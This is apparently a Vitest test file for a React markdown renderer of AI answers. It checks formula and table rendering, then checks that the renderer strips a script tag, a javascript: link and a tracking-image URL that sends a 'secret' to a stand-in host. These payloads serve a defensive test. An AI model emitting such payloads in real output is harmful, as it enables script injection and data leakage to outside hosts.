import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import AiMarkdown from './components/AiMarkdown';

describe('AI answer rendering',()=>{
  it('renders formulas and tables for both chat and saved notes',()=>{
    const html=renderToStaticMarkup(<AiMarkdown text={'$$E=mc^2$$\n\n|变量|含义|\n|---|---|\n|m|质量|'}/>);
    expect(html).toContain('katex');expect(html).toContain('<table>');expect(html).toContain('质量');
  });
  it('keeps untrusted answers from executing HTML or loading remote tracking images',()=>{
    const html=renderToStaticMarkup(<AiMarkdown text={'<script>alert(1)</script>\n\n![tracking](https://untrusted.test/pixel?secret=paper)\n\n[link](javascript:alert%281%29)'}/>);
    expect(html).not.toContain('<script>');expect(html).not.toContain('<img');expect(html).not.toContain('href="javascript:');expect(html).not.toContain('src="https://untrusted');
  });
});
